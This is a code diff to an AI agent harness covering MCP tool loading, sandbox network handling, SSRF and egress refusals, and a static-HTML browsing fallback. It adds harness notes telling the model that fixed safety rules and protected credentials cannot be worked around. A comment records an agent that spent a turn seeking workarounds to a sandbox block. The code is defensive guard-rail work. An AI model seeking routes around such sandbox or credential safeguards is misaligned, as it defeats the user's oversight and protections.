 TOOL_REQUIRED_PARAMS = {name: required_params(spec) for name, spec in TOOL_SPECS.items()}
 
 
-def reload_mcp_tools():
-    """Reconnect MCP servers and refresh their registered tools."""
+# Longest a turn waits for the startup MCP connect before going ahead without
+# those tools (they are picked up on a later turn once connected).
+MCP_STARTUP_WAIT_SECONDS = max(0, _config_int("mcp_startup_wait_seconds", 20))
+_MCP_PENDING = {"tools": None}
+_MCP_PENDING_LOCK = threading.Lock()
+
+
+def _apply_mcp_tools(tools: dict) -> None:
+    """Swap the registered MCP tools for `tools`. Never from the background
+    connect thread: TOOL_SPECS and the derived tables are read everywhere
+    without a lock, so this runs on the thread starting a turn (or /mcp)."""
     global TOOLS_DEF, TOOL_NAMES, TOOL_REQUIRED_PARAMS, SYSTEM_PROMPT
     for name, spec in list(TOOL_SPECS.items()):
         if spec.get("mode") == "mcp":
             TOOL_SPECS.pop(name)
-    TOOL_SPECS.update(MCP_RUNTIME.reload(TOOL_SPECS))
+    TOOL_SPECS.update(tools)
     TOOLS_DEF = build_tools_def(TOOL_SPECS)
     TOOL_NAMES = set(TOOL_SPECS)
     TOOL_REQUIRED_PARAMS = {name: required_params(spec) for name, spec in TOOL_SPECS.items()}
-    SYSTEM_PROMPT = compose_system_prompt()
+    if "SYSTEM_PROMPT" in globals():  # not yet composed during import
+        SYSTEM_PROMPT = compose_system_prompt()
+
+
+def _start_mcp_background() -> None:
+    """Connect configured MCP servers on a daemon thread. A no-op (no thread)
+    when no mcp.json exists, which is the common case."""
+    if not MCP_RUNTIME.has_servers():
+        return
+
+    def done(tools):
+        with _MCP_PENDING_LOCK:
+            _MCP_PENDING["tools"] = tools
+        _report_mcp()
+
+    reserved = {name for name, spec in TOOL_SPECS.items() if spec.get("mode") != "mcp"}
+    MCP_RUNTIME.reload_in_background(reserved, on_done=done)
+
+
+def ensure_mcp_ready(timeout: float | None = None) -> bool:
+    """Register the startup MCP tools once their background connect is done.
+
+    Called before a turn builds its tool list (so the first model call sees
+    them), waiting at most `timeout` (default mcp_startup_wait_seconds).
+    timeout=0 only applies a finished result. True when nothing is pending.
+    """
+    ready = MCP_RUNTIME.wait_ready(MCP_STARTUP_WAIT_SECONDS if timeout is None else timeout)
+    with _MCP_PENDING_LOCK:
+        tools, _MCP_PENDING["tools"] = _MCP_PENDING["tools"], None
+    if tools is not None:
+        _apply_mcp_tools(tools)
+    return ready
+
+
+def mcp_status_summary() -> dict:
+    """{connected, failed, connecting, tools, pending, text} for a banner or
+    /doctor; text is e.g. "MCP: 1 failed (see /mcp)" or "" with no servers."""
+    ensure_mcp_ready(0)
+    return MCP_RUNTIME.summary()
+
+
+def reload_mcp_tools():
+    """Reconnect MCP servers and refresh their registered tools."""
+    # Let a startup connect finish first: two reloads at once would race over
+    # the same sessions. Its result is superseded by this reload.
+    MCP_RUNTIME.wait_ready(MCP_STARTUP_WAIT_SECONDS)
+    with _MCP_PENDING_LOCK:
+        _MCP_PENDING["tools"] = None
+    reserved = {name: spec for name, spec in TOOL_SPECS.items() if spec.get("mode") != "mcp"}
+    _apply_mcp_tools(MCP_RUNTIME.reload(reserved))
+    _report_mcp()
     return MCP_RUNTIME.statuses
+
+
+def _report_mcp() -> None:
+    """capabilities.MCP from the runtime's statuses: degraded while any
+    configured server failed, ok when all connected, cleared with none."""
+    try:
+        statuses = dict(MCP_RUNTIME.statuses)
+        summary = MCP_RUNTIME.summary()
+        connected, failed = summary["connected"], summary["failed"]
+        total = len(connected) + len([n for n in failed if not n.startswith(("config:", "teardown", "startup"))])
+        if not connected and not failed:
+            capabilities.clear(capabilities.MCP)
+            return
+        active = f"{len(connected)}/{total} servers"
+        if not failed:
+            capabilities.report(capabilities.MCP, active=active, preferred="", state=capabilities.OK)
+            return
+        first = failed[0]
+        error = str(statuses.get(first, {}).get("error") or "failed")
+        capabilities.report(
+            capabilities.MCP, active=active, preferred="",
+            state=capabilities.DEGRADED if connected else capabilities.UNAVAILABLE,
+            reason=f"{first}: {error}"[:160],
+            impact=f"tools from {', '.join(failed[:3])}{' …' if len(failed) > 3 else ''} unavailable",
+            fix="/mcp")
+    except Exception:  # noqa: BLE001 — reporting must never break a tool call
+        _log.debug("mcp capability report failed", exc_info=True)
 
 
 atexit.register(MCP_RUNTIME.close)
@@ -3609,6 +4354,8 @@ if SKILL_PACKAGES:
 
 
 SYSTEM_PROMPT = compose_system_prompt()
+# After the skill merge, so MCP tool names are chosen around the skill tools.
+_start_mcp_background()
 
 _last_tool_output = ""
 _last_tool_name = ""
@@ -3630,7 +4377,7 @@ AGENTS_DIR = Path(APP_CONFIG.get("agents_dir", str(APP_DIR / "agents"))).expandu
 USER_AGENTS_DIR = Path(APP_CONFIG.get("user_agents_dir",
                                       str(_agent_data_dir() / "agents"))).expanduser()
 DEFAULT_SUBAGENT = APP_CONFIG.get("default_subagent", "general-purpose")
-SUBAGENT_MAX_DEPTH = int(APP_CONFIG.get("subagent_max_depth", "1"))
+SUBAGENT_MAX_DEPTH = _config_int("subagent_max_depth", 1)
 
 _DEFAULT_SUBAGENT_PROFILE = {
     "name": "general-purpose",
@@ -3663,8 +4410,8 @@ def load_subagent_specs(agents_dir: Path, user_agents_dir: Path = None) -> dict:
                 # A persisted per-profile override (written by /limits) wins over
                 # the profile's own frontmatter, for the same reason as tool
                 # timeouts above.
-                "max_turns": int(APP_CONFIG.get(f"subagent_max_turns.{name}")
-                                 or meta.get("max_turns", "8")),
+                "max_turns": (_config_int(f"subagent_max_turns.{name}", 0)
+                              or _positive_int(meta.get("max_turns", "8"), 8)),
                 # Optional permission floor for the sub-run. Only "readonly" is
                 # honoured: a profile may restrict itself below the caller's mode,
                 # never widen past it.
@@ -3688,6 +4435,24 @@ SUBAGENT_SPECS = load_subagent_specs(AGENTS_DIR, USER_AGENTS_DIR)
 # Left None, sub-agents run silently (benchmark, one-shot, plain REPL) — so this
 # is fully backward-compatible. Kept out of the loop, same as every other hook.
 subagent_ui = None
+# Front-end hook: the commands the person can type (CLI slash commands, gateway
+# /approve and friends), as name -> (usage, description). Each front end
+# registers its own table at start-up; empty here, so the engine knows none.
+# Without it the model, asked "what does /local do", said no such command
+# existed -- it only ever sees tool schemas.
+FRONTEND_COMMANDS = {}
+
+
+def register_frontend_commands(commands: dict) -> None:
+    """Replace the command table describe_tool and per-turn facts read from.
+
+    Each value is (usage, description) or (usage, description, details), where
+    details spells out every subcommand -- without it the model invents them.
+    """
+    global FRONTEND_COMMANDS
+    FRONTEND_COMMANDS = {
+        str(name).lstrip("/").lower(): tuple(str(part) for part in (*entry, "")[:3])
+        for name, entry in dict(commands).items()}
 # Human-in-the-loop hook: a presentation layer (e.g. Rich CLI) may set this to
 #   human_input_handler(question, reason) -> str
 # to present an interactive prompt with terminal UI controls (e.g. pausing spinners).
@@ -4034,6 +4799,29 @@ def kill_running_commands() -> int:
     return killed
 
 
+def _wait_interruptibly(process, timeout):
+    """process.wait(timeout) that also notices ESC/Stop.
+
+    The child runs in its own session, so the terminal's interrupt never
+    reaches it, and a plain wait() left Stop doing nothing until a long
+    command finished on its own. Polls in short slices against the running
+    turn's interrupt check; the caller's BaseException handler kills the
+    process group when this raises.
+    """
+    check = _document_interrupt
+    if not check:
+        return process.wait(timeout=timeout)
+    deadline = time.monotonic() + timeout
+    while True:
+        try:
+            return process.wait(timeout=max(0.0, min(0.2, deadline - time.monotonic())))
+        except subprocess.TimeoutExpired:
+            if time.monotonic() >= deadline:
+                raise
+        if check():
+            raise AgentInterrupted()
+
+
 def _exec_process(command, timeout: int = 25, shell: bool = False) -> str:
     kwargs = {
         "shell": shell,
@@ -4080,10 +4868,17 @@ def _exec_process(command, timeout: int = 25, shell: bool = False) -> str:
         with _RUNNING_COMMANDS_LOCK:
             _RUNNING_COMMANDS.add(process)
         try:
-            returncode = process.wait(timeout=timeout)
+            returncode = _wait_interruptibly(process, timeout)
         except subprocess.TimeoutExpired:
             _kill_detached_process(process)
             reader.join(timeout=2)
+            # The tail is usually where it was stuck ("waiting for input",
+            # a retry loop, a hung download) -- the model needs it to pick a
+            # different approach rather than rerun the same command.
+            tail = bytes(output[-2048:]).decode(errors="replace").strip()
+            if tail:
+                return (f"Command timed out after {timeout}s. Last output:\n"
+                        f"{tail}")
             return f"Command timed out after {timeout}s."
         except BaseException:
             # Ctrl+C mid-command: see _kill_detached_process for why the child
@@ -4123,8 +4918,191 @@ def _exec_shell_command(command: str, timeout: int = 25, image: str = "") -> str
     return _exec_sandbox_command(command, timeout=timeout, image=image)
 
 
+# What a closed sandbox network looks like from inside: DNS that never answers
+# (Docker --network none), the native runtime's proxy refusing the tunnel, or no
+# route at all. curl, wget, Python, pip, npm and Windows each word it differently.
+_SANDBOX_NETWORK_FAILURE_RE = re.compile(
+    r"could not resolve host|unable to resolve host address|temporary failure in name resolution"
+    r"|name or service not known|nodename nor servname|getaddrinfo (?:failed|ENOTFOUND|EAI_AGAIN)"
+    r"|network is unreachable|failed to establish a new connection"
+    r"|tunnel connection failed|CONNECT tunnel failed"
+    # Windows: DNS (curl.exe, PowerShell) and the sandbox firewall (WinError 10013).
+    r"|no such host is known|remote name could not be resolved"
+    r"|forbidden by its access permissions",
+    re.IGNORECASE,
+)
+# --- Config blockers ----------------------------------------------------------
+# A refusal caused by a config.txt setting reads, to the model, like an obstacle
+# to get around: a real run spent its whole turn on workarounds for a download
+# the sandbox could never make. Told about the limits up front, a small model
+# gives up before trying. So each kind of refusal is counted per turn and, at the
+# third, one note says which setting is responsible and that only the user can
+# change it -- the same shape as the denial breaker. Notes name settings and what
+# the model already tried (a host, a path), never a URL path, query or config
+# value, and credential or fixed-rule refusals never name a way to unlock them.
+CONFIG_BLOCKER_NOTE_AFTER = 3
+_turn_blocker_counts = {}
+_pending_blocker_note = ""
+_FIXED_RULE_NOTE = ("This was refused by a fixed safety rule; no setting or approval "
+                    "changes it. Do not look for another way to do the same thing. "
+                    "Tell the user plainly what you could not do.")
+_PROTECTED_NOTE = ("This is a protected file or credential, refused by a fixed safety "
+                   "rule; no setting or approval changes it here. Do not look for "
+                   "another way to read, write or send it. If the user needs it, they "
+                   "can open it themselves.")
+_TIMEOUT_RE = re.compile(r"Command timed out after \d+s")
+
+
+def _config_file() -> str:
+    """Where the user edits settings, always naming config.txt even when
+    AGENT8088_CONFIG points at a file called something else."""
+    return str(CONFIG_PATH) if CONFIG_PATH.name == "config.txt" else f"config.txt ({CONFIG_PATH})"
+
+
+def _count_blocker(kind: str) -> bool:
+    """Count one refusal of this kind; True exactly when it reaches the threshold."""
+    _turn_blocker_counts[kind] = _turn_blocker_counts.get(kind, 0) + 1
+    return _turn_blocker_counts[kind] == CONFIG_BLOCKER_NOTE_AFTER
+
+
+def _blocker_note(text: str) -> str:
+    return (f"\n{_HARNESS_PREFIX}Refused {CONFIG_BLOCKER_NOTE_AFTER} times this turn. "
+            f"{text}")
+
+
+def _internal_host_note(url: str) -> tuple:
+    """The SSRF refusal's note. Offers ssrf_allow_hosts only for a literal LAN or
+    loopback address the user may run a service on -- never a name (it could
+    resolve anywhere) and never the link-local cloud-metadata range."""
+    import ipaddress
+    parts = urllib.parse.urlsplit(url)
+    host = parts.hostname or ""
+    try:
+        port = parts.port or (443 if parts.scheme == "https" else 80)
+        ip = ipaddress.ip_address("127.0.0.1" if host == "localhost" else host)
+    except ValueError:
+        return "fixed_rule", _FIXED_RULE_NOTE
+    if ip.is_link_local or not (ip.is_private or ip.is_loopback):
+        return "fixed_rule", _FIXED_RULE_NOTE
+    return "ssrf", (f"`{host}` is on a private or local network, which web tools may "
+                    "not reach by default. If it is the user's own service, only they "
+                    f"can allow that one address with `ssrf_allow_hosts={host}:{port}` in "
+                    f"{_config_file()}. Stop retrying; tell the user.")
+
+
+def _config_blocker(reason: str, detail: str):
+    """(kind, note text) for a refusal a person could act on, else None."""
+    if reason == "blocked_path":
+        return "blocked_path", (f"Writing to `{detail}` is blocked by `blocked_paths` in "
+                                f"{_config_file()}. Only the user can change that list. Stop "
+                                "retrying; write somewhere else or tell the user.")
+    if reason == "hard_blocked_shell":
+        if _matches_user_deny(detail):
+            return "deny_commands", ("This command matches the user's own `deny_commands` "
+                                     f"rule in {_config_file()}. Only the user can change it. "
+                                     "Stop retrying; tell the user.")
+        if _outside_user_allowlist(detail):
+            return "allow_commands", ("Only commands matching `allow_commands` in "
+                                      f"{_config_file()} may run, and this one does not. Only "
+                                      "the user can change that list. Stop retrying; "
+                                      "tell the user.")
+        return "fixed_rule", _FIXED_RULE_NOTE
+    if reason in ("sensitive_path", "shell_startup_file", "sensitive_query", "outbound_secret"):
+        return "protected", _PROTECTED_NOTE
+    if reason == "egress_policy":
+        if _egress_check(detail):
+            host = urllib.parse.urlsplit(detail).hostname or "this host"
+            return "egress_domains", (f"`{host}` is outside the web domain policy "
+                                      "(`allowed_domains` / `blocked_domains` in "
+                                      f"{_config_file()}). Only the user can change it. "
+                                      "Stop retrying; tell the user.")
+        return _internal_host_note(detail)
+    return None
+
+
+def _note_config_blocker(reason: str, detail: str) -> None:
+    """Called for every audited refusal. Never raises: it only adds advice."""
+    global _pending_blocker_note
+    try:
+        found = _config_blocker(reason, detail)
+        if found and _count_blocker(found[0]):
+            _pending_blocker_note = _blocker_note(found[1])
+    except Exception as exc:  # noqa: BLE001 — advice must never break a refusal
+        _log.debug("config blocker note failed: %s", exc)
+
+
+def _take_blocker_note() -> str:
+    global _pending_blocker_note
+    note, _pending_blocker_note = _pending_blocker_note, ""
+    return note
+
+
+def _turn_limit_reason(limit: int) -> str:
+    """Footer for a run that hit max_turns. The user reads it, so it says how
+    to raise the limit -- first-run users hit it repeatedly with no way to know."""
+    return (f"reached the {limit}-turn limit before completing the task -- raise it "
+            "with /maxturns, or max_turns in config.txt")
+
+
+def _timeout_note(result: str) -> str:
+    if not _TIMEOUT_RE.search(result or "") or not _count_blocker("timeout"):
+        return ""
+    return _blocker_note(
+        f"Commands are capped at `max_tool_timeout_seconds` ({MAX_TOOL_TIMEOUT_SECONDS}s). "
+        "A call may pass a larger `timeout` up to that cap; beyond it, only the user can "
+        f"raise it, with /limits or in {_config_file()}. Otherwise narrow the command.")
+
+
+def _sandbox_network_note(result: str, source: str) -> str:
+    """The note to append when sandboxed code keeps hitting the closed network.
+
+    The sandbox reaches only the hosts in sandbox_allowed_domains (none by
+    default; none at all on the Docker fallback), and nothing in a failed fetch
+    says so. Counted like every other config blocker.
+    """
+    if not _SANDBOX_NETWORK_FAILURE_RE.search(result or ""):
+        return ""
+    if not _count_blocker("sandbox_network"):
+        return ""
+    hosts = sorted({urllib.parse.urlsplit(url).hostname or ""
+                    for url in _SHELL_HTTP_URL.findall(source or "")} - {""})
+    needed = ", ".join(hosts) or "the host this task needs"
+    allowed = ", ".join(SANDBOX_ALLOWED_DOMAINS) or "none"
+    if _resolve_sandbox_backend() == "docker":
+        setting = ("Commands are running in the Docker fallback, which has no network "
+                   "at all, because the native sandbox is not set up. The user can "
+                   "set it up with `agent8088 --sandbox-setup` (on Linux it needs "
+                   "bubblewrap, socat and ripgrep), then add "
+                   f"`sandbox_allowed_domains={needed}` to {_config_file()}.")
+    else:
+        setting = (f"Sandboxed commands reach only the hosts in `sandbox_allowed_domains` "
+                   f"in {_config_file()} (currently: {allowed}). The user can add "
+                   f"`sandbox_allowed_domains={needed}` there and restart Agent8088.")
+    return (f"\n{_HARNESS_PREFIX}The sandbox has blocked network access "
+            f"{CONFIG_BLOCKER_NOTE_AFTER} times this turn. This is a setting, not a "
+            f"problem to work around. {setting} Only the user can change config.txt. "
+            "Stop retrying the download; tell the user what this task needs and "
+            "that they can change the setting or fetch the file themselves.")
+
+
 def _process_display(argv: list) -> str:
     return subprocess.list2cmdline(argv) if sys.platform == "win32" else shlex.join(argv)
+
+
+def _python_snippet_command(code: str) -> str:
+    """Shell command line that runs a Python snippet, newlines and all.
+
+    cmd.exe ends a command at its first newline, so `python -c "<code>"` ran
+    only the first line of a multi-line snippet and reported success with no
+    output. Passing the source base64-encoded keeps the command on one line and
+    free of quotes on every platform.
+    """
+    import base64
+
+    encoded = base64.b64encode(code.encode("utf-8")).decode("ascii")
+    loader = ("import base64;exec(compile(base64.b64decode("
+              f"'{encoded}').decode('utf-8'),'<sandbox>','exec'))")
+    return _process_display([sys.executable, "-c", loader])
 
 
 # Auth failures git reports once prompting is disabled. Each is a dead end the
@@ -4523,7 +5501,7 @@ def _plan_step_failed(result: str) -> bool:
 PLAN_AUDIT = APP_CONFIG.get("plan_audit", "0").strip().lower() in ("1", "true", "yes", "on")
 PLAN_AUDIT_REVERT = APP_CONFIG.get("plan_audit_revert", "1").strip().lower() in (
     "1", "true", "yes", "on")
-PLAN_REVERT_MAX_BYTES = int(APP_CONFIG.get("plan_audit_revert_max_bytes", str(1 << 20)))
+PLAN_REVERT_MAX_BYTES = _config_int("plan_audit_revert_max_bytes", 1 << 20)
 # Ceiling on auditor calls in one top-level turn. The only previous guard was
 # `_active_budget.exceeded()`, and max_turn_seconds/_tokens/_cost all default to
 # 0, which means "disabled" — so on a default install `exceeded()` stays None
@@ -4533,7 +5511,7 @@ PLAN_REVERT_MAX_BYTES = int(APP_CONFIG.get("plan_audit_revert_max_bytes", str(1 
 # kind, spawning a fresh six-turn sub-agent per tool call until max_turns ran
 # out. There is no "unlimited" value on purpose; to stop verifying, set
 # plan_audit=0.
-PLAN_AUDIT_MAX_PER_TURN = max(0, int(APP_CONFIG.get("plan_audit_max_per_turn", "12")))
+PLAN_AUDIT_MAX_PER_TURN = max(0, _config_int("plan_audit_max_per_turn", 12))
 # Wall clock for ONE auditor sub-run. `_exec_subagent` shares the parent's
 # budget so a sub-agent cannot hand itself a fresh allowance — correct, but on a
 # default install that budget's max_seconds is 0, so what the auditor inherited
@@ -4541,11 +5519,11 @@ PLAN_AUDIT_MAX_PER_TURN = max(0, int(APP_CONFIG.get("plan_audit_max_per_turn", "
 # auditor still thrashing on denied paths eleven minutes later. Verification
 # must never be able to outlast the work it verifies.
 PLAN_AUDIT_TIMEOUT_SECONDS = max(
-    1, int(APP_CONFIG.get("plan_audit_timeout_seconds", "120")))
+    1, _config_int("plan_audit_timeout_seconds", 120))
 # The same ceiling for every other sub-agent. Wider than the auditor's, because
 # a coder or researcher is doing the work rather than checking it — but finite,
 # which is what it was not.
-SUBAGENT_TIMEOUT_SECONDS = max(1, int(APP_CONFIG.get("subagent_timeout_seconds", "300")))
+SUBAGENT_TIMEOUT_SECONDS = max(1, _config_int("subagent_timeout_seconds", 300))
 # Modes whose effect leaves something durable to inspect afterwards. `browser` is
 # deliberately absent: a rendered page closes over nothing, so auditing it buys an
 # inconclusive verdict at the price of a model call. Reads are absent for the
@@ -5449,9 +6427,9 @@ def _exec_autotest(args: dict, depth: int = 0) -> str:
         if snapshot is not None:
             try:
                 source.write_bytes(snapshot)
-                repair = (f" It has been restored to its exact contents from before "
-                          f"the run, so the code under test is intact; the tests the "
-                          f"sub-agent wrote may not match it.")
+                repair = (" It has been restored to its exact contents from before "
+                          "the run, so the code under test is intact; the tests the "
+                          "sub-agent wrote may not match it.")
             except OSError as exc:
                 repair = (f" Restoring it FAILED ({exc}) -- inspect this file by hand.")
         # Shown above the report on purpose: the report will claim success.
@@ -5607,9 +6585,17 @@ def _exec_subagent(args: dict, depth: int = 0, history: list | None = None,
             client=client,
             provider_name=ACTIVE_PROVIDER or DEFAULT_PROVIDER,
             model_name=target_model,
+            # The parent's ESC check. Without it the child ran deaf to Stop,
+            # and its run_agent also cleared the parent's _document_interrupt.
+            interrupt_check=_document_interrupt,
         )
+    except (AgentInterrupted, TurnBudgetExceeded):
+        raise  # Stop ends the whole turn, not just this delegation
     except Exception as e:  # a broken sub-run must not kill the parent turn
-        answer = f"Sub-agent failed: {e}"
+        answer = efficiency.tool_error(
+            "subagent_failed", f"Sub-agent '{type_name}' failed: {e or type(e).__name__}",
+            "Do the task directly with your own tools, or retry the delegation once "
+            "with a smaller, more specific task.", recoverable=True)
     finally:
         _INHERITED_USER_TURNS = saved_inherited
         _active_budget = parent_budget
@@ -5935,10 +6921,7 @@ def _int_config(key: str, default: int) -> int:
     _browser_max_actions_per_step already does for its own value and fall
     back to the documented default.
     """
-    try:
-        return int(str(APP_CONFIG.get(key, default)).strip())
-    except (TypeError, ValueError):
-        return default
+    return _config_int(key, default)
 
 
 BROWSER_MAX_STEPS = _int_config("browser_max_steps", 25)
@@ -5950,7 +6933,7 @@ BROWSER_TASK_TIMEOUT_SECONDS = _int_config("browser_task_timeout_seconds", 600)
 # is the reliable default (it prevents the stale-index cascade seen in
 # checkout), but it multiplies the cost of a form: raise it for a form-heavy
 # run, at the price of acting on a DOM that a previous action may have changed.
-BROWSER_MAX_ACTIONS_PER_STEP = int(APP_CONFIG.get("browser_max_actions_per_step", "1"))
+BROWSER_MAX_ACTIONS_PER_STEP = _config_int("browser_max_actions_per_step", 1)
 # Headless is the right default for a tool that runs unattended, but it leaves
 # no way to *watch* a run - which is exactly what a demo or a stuck-selector
 # debugging session needs. Opt in with browser_headless=0, or per-run with
@@ -6804,6 +7787,134 @@ async def _run_browser_agent(url: str, task: str,
     return content, "\n".join(notes)
 
 
+# --- browse_page without a browser: a static HTML read --------------------
+# When Playwright, Chromium or browser-use is missing, a read-only request
+# ("summarize this page", "what does it say about X") is still answerable from
+# the page's HTML. Interactive tasks are refused as before: no JavaScript ran,
+# nothing can be clicked or filled.
+_BROWSER_INTERACTIVE = re.compile(
+    r"\b(click|tap|press|fill|type|enter (?:my|the|a)|submit|log ?in|sign ?(?:in|up)|"
+    r"select|choose|check ?out|book|buy|purchase|order|add to cart|upload|download|"
+    r"scroll|hover|drag|navigate|go to|open the .* (?:menu|tab|link)|play|search for|"
+    r"screenshot|interact)\b", re.IGNORECASE)
+STATIC_PAGE_MAX_CHARS = 20000
+_STATIC_PAGE_TYPES = ("text/html", "application/xhtml+xml", "text/plain", "")
+
+
+def _browser_task_is_read_only(task: str) -> bool:
+    """A read/extract request that a static HTML fetch can serve."""
+    return not _BROWSER_INTERACTIVE.search(str(task or ""))
+
+
+def _html_to_text(html: str) -> str:
+    """Readable text from HTML: drops script/style/etc., keeps block breaks."""
+    from html.parser import HTMLParser
+
+    skip = {"script", "style", "noscript", "template", "svg", "head", "iframe"}
+    blocks = {"p", "div", "br", "li", "tr", "h1", "h2", "h3", "h4", "h5", "h6",
+              "section", "article", "header", "footer", "pre", "blockquote", "table"}
+
+    class _Text(HTMLParser):
+        def __init__(self):
+            super().__init__(convert_charrefs=True)
+            self.parts, self.depth, self.title, self._in_title = [], 0, "", False
+
+        def handle_starttag(self, tag, attrs):
+            if tag == "title":
+                self._in_title = True
+            if tag in skip:
+                self.depth += 1
+            elif tag in blocks:
+                self.parts.append("\n")
+
+        def handle_endtag(self, tag):
+            if tag == "title":
+                self._in_title = False
+            if tag in skip and self.depth:
+                self.depth -= 1
+            elif tag in blocks:
+                self.parts.append("\n")
+
+        def handle_data(self, data):
+            if self._in_title:
+                self.title += data
+            elif not self.depth:
+                self.parts.append(data)
+
+    parser = _Text()
+    try:
+        parser.feed(html)
+        parser.close()
+    except Exception:  # noqa: BLE001 — malformed HTML: keep what was parsed
+        pass
+    lines = [" ".join(line.split()) for line in "".join(parser.parts).splitlines()]
+    text = "\n".join(line for line in lines if line)
+    title = " ".join(parser.title.split())
+    return f"Title: {title}\n\n{text}" if title else text
+
+
+def _browser_install_hint(missing: str) -> str:
+    python = sys.executable or "python"
+    if missing == "playwright":
+        return f"`{python} -m pip install playwright && {python} -m playwright install chromium`"
+    if missing == "browser-use":
+        return "reinstall agent8088 on Python 3.11+ (browser-use)"
+    return f"`{python} -m playwright install chromium`"
+
+
+def _report_browser(missing: str = "") -> None:
+    """capabilities.BROWSER: degraded to static HTML reads while `missing`."""
+    try:
+        if not missing:
+            capabilities.report(capabilities.BROWSER, active="chromium", preferred="chromium",
+                                state=capabilities.OK)
+            return
+        label = {"playwright": "Playwright", "browser-use": "browser-use"}.get(missing, "Chromium")
+        capabilities.report(
+            capabilities.BROWSER, active="static HTML fetch", preferred="chromium",
+            state=capabilities.DEGRADED, reason=f"{label} isn't installed",
+            impact="browse_page reads static HTML only: no JavaScript, no clicking or forms",
+            fix=_browser_install_hint(missing).strip("`"))
+    except Exception:  # noqa: BLE001
+        _log.debug("browser capability report failed", exc_info=True)
+
+
+def _static_page_read(url: str, task: str, missing: str, refusal: str) -> str:
+    """browse_page's fallback: fetch the page over plain HTTP and return its text.
+
+    Same guards as every other fetch: _fetch_url_bytes runs _egress_check and
+    _ssrf_check on the URL and on every redirect, connects only to the vetted
+    address (_build_safe_opener / _pinned_connection, no DNS rebinding) and
+    caps the body at MAX_HTTP_BYTES. Like the browsing proxy, the local search
+    endpoint allowance does not apply: only ssrf_allow_hosts relaxes it.
+    """
+    _report_browser(missing)
+    if not _browser_task_is_read_only(task):
+        return refusal
+    import urllib.parse
+    parts = urllib.parse.urlparse(url)
+    host = (parts.hostname or "").lower()
+    if parts.port and f"{host}:{parts.port}" in _SEARCH_ALLOW_HOSTS and not (
+            host in SSRF_ALLOW_HOSTS or f"{host}:{parts.port}" in SSRF_ALLOW_HOSTS):
+        return f"Blocked: '{host}:{parts.port}' is the local search endpoint, not a page to browse."
+    raw, error, content_type = _fetch_url_bytes(url)
+    if error:
+        return f"{refusal}\n(Static fetch fallback also failed: {error})"
+    if (content_type or "") not in _STATIC_PAGE_TYPES:
+        return f"{refusal}\n(Static fetch fallback: {url} is {content_type}, not a web page.)"
+    html = raw.decode("utf-8", errors="replace")
+    text = html if content_type == "text/plain" else _html_to_text(html)
+    if len(text) > STATIC_PAGE_MAX_CHARS:
+        text = text[:STATIC_PAGE_MAX_CHARS] + f"\n[... truncated at {STATIC_PAGE_MAX_CHARS} characters]"
+    if not text.strip():
+        text = "(the page has no static text; it is probably rendered by JavaScript)"
+    label = {"playwright": "Playwright isn't", "browser-use": "browser-use isn't"}.get(
+        missing, "Chromium isn't")
+    note = (f"[note: static HTML fetch — no JavaScript, no interaction; {label} installed "
+            f"({_browser_install_hint(missing)})]")
+    return f"{_wrap_untrusted(_strip_special_tokens(text), url)}\n{note}"
+
+
 def _exec_browser(args: dict) -> str:
     """Load a page and complete a task on it in a real headless browser --
     click, fill forms, navigate, and extract information via natural-
@@ -6836,14 +7947,17 @@ def _exec_browser(args: dict) -> str:
     if blocked:
         return blocked
     if not _playwright_available():
-        return ("Playwright is not installed. Install it with:\n"
+        return _static_page_read(url, task, "playwright", (
+                "Playwright is not installed. Install it with:\n"
                 "  pip install playwright && playwright install chromium\n"
-                "Until then, use web_search or get_page_title instead.")
+                "Until then, use web_search or get_page_title instead, or ask "
+                "browse_page only to read/extract (served as static HTML)."))
     if not _browser_use_available():
-        return ("Interactive browsing is unavailable: the browser-use package "
+        return _static_page_read(url, task, "browser-use", (
+                "Interactive browsing is unavailable: the browser-use package "
                 "is not installed. It requires Python 3.11 or newer, so it is "
                 "skipped on a Python 3.10 install. Reinstall Agent8088 on "
-                "Python 3.11+, or use web_search or get_page_title instead.")
+                "Python 3.11+, or use web_search or get_page_title instead."))
     try:
         # Before the first Playwright connection: the Chromium path probe
         # below opens one, and Playwright's teardown abandons the
@@ -6856,11 +7970,14 @@ def _exec_browser(args: dict) -> str:
         _set_browser_use_log_verbosity(SHOW_REASONING)
         executable_path = _playwright_chromium_executable()
     except Exception as e:
-        return f"Browser error: {e}"
+        return f"Error: Browser error: {e}"
     if executable_path is None:
-        return ("Playwright's Chromium browser is not installed. Install it with:\n"
+        return _static_page_read(url, task, "chromium", (
+                "Playwright's Chromium browser is not installed. Install it with:\n"
                 "  playwright install chromium\n"
-                "Until then, use web_search or get_page_title instead.")
+                "Until then, use web_search or get_page_title instead, or ask "
+                "browse_page only to read/extract (served as static HTML)."))
+    _report_browser()
 
     saved_role, _active_role = _active_role, "subagent:browser"
     try:
@@ -6873,7 +7990,7 @@ def _exec_browser(args: dict) -> str:
         else:
             browser_result = asyncio.run(_run_browser_agent(url, task, executable_path))
     except asyncio.TimeoutError:
-        return (f"Browser error: task exceeded the {_browser_task_timeout()}s "
+        return (f"Error: Browser error: task exceeded the {_browser_task_timeout()}s "
                 f"time limit (raise AGENT8088_BROWSER_TASK_TIMEOUT_SECONDS for this "
                 "run, or browser_task_timeout_seconds in config.txt; "
                 "max_tool_timeout_seconds remains the hard cap).")
@@ -6894,7 +8011,7 @@ def _exec_browser(args: dict) -> str:
         logging.getLogger("asyncio").setLevel(logging.CRITICAL)
         raise
     except Exception as e:
-        return f"Browser error: {e}"
+        return f"Error: Browser error: {e}"
     finally:
         _active_role = saved_role
 
@@ -7229,7 +8346,9 @@ def set_sandbox_backend(backend: str) -> dict:
     update_simple_config(CONFIG_PATH, {"sandbox_backend": backend})
     APP_CONFIG["sandbox_backend"] = backend
     SANDBOX_BACKEND = backend
-    return sandbox_status()
+    status = sandbox_status()
+    _report_sandbox(status)
+    return status
 
 
 def _sandbox_settings_data(readonly: bool = False, workspace: Path | None = None) -> dict:
@@ -7366,6 +8485,8 @@ def _mark_native_sandbox_broken(result: str, quiet: bool = False) -> None:
         # `--sandbox-setup` run used to print the identical paragraph twice.
         _log.warning("native sandbox could not start. Reason: %s",
                      _native_sandbox_failure[:200])
+    if first_failure:
+        _report_sandbox()  # native -> docker (or nothing) mid-session: say so
 
 
 def _native_sandbox_ready(cwd: Path, readonly: bool = False,
@@ -7460,6 +8581,7 @@ def _mark_docker_sandbox_broken(result: str) -> None:
     if first_failure:
         _log.warning("docker sandbox could not start. %s",
                      _docker_sandbox_repair_hint(_docker_sandbox_failure))
+        _report_sandbox()
 
 
 def _docker_sandbox_repair_hint(result: str) -> str:
@@ -7572,10 +8694,65 @@ def verify_sandbox_backend() -> dict:
